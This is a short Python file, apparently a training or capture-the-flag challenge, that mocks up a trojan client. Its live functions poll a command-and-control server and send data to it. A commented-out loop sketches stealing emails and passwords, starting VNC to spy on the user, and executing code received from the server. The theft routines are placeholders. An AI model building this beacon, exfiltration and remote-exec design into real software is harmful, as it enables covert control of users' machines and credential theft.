import requests  # http stuff
# import trojan  # good thing python has everything
import time  # got the time

# my secret malware panel
CNC_URL = 'https://secretpanel.ecsm2016.cert.pl'
CNC_PATH = '/get_command'

def cnc_get_command():
    # get command from c&c
    r = requests.get(CNC_URL + CNC_PATH)
    print (r.json())
    return r.json()

def cnc_send_data(data):
    # send informations to c&c
    r = requests.get(CNC_URL + CNC_PATH, params={'data': data})
    print(r.json());
    return r.json()



# def main():
#     while True:
#         command = cnc_get_command()
#         if command['command'] == 'sleep':
#             # nothing to do, just
#             time.sleep(int(command['sleep_seconds']))
#         elif command['command'] == 'get_emails':
#             # steal emails from user
#             # emails = trojan.steal_emails()
#             emails = "aaaa"
#             cnc_send_data(emails)
#         elif command['command'] == 'get_passwords':
#             # steal passwords from user
#             # passwords = trojan.steal_passwords()
#             passwords="aaaa"
#             cnc_send_data(passwords)
#         elif command['command'] == 'start_vnc':
#             # start vnc server so we can spy on the computer
#             # emails = trojan.run_vnc_server(5900)
#             continue
#         elif command['command'] == 'start_vnc':
#             # start vnc server so we can spy on the computer
#             continue
#             # emails = trojan.run_vnc_server(5900)
#         elif command['command'] == 'eval_code':
#             # execute our malicious code
#             # exec(command['python_code'])
#             continue
#         else:
#             # otherwise just sleep
#             time.sleep(1)

if __name__ == '__main__':
    print ('Advanced Stealthy Trojan 1337')
    cnc_send_data(["lol"])
    # main()
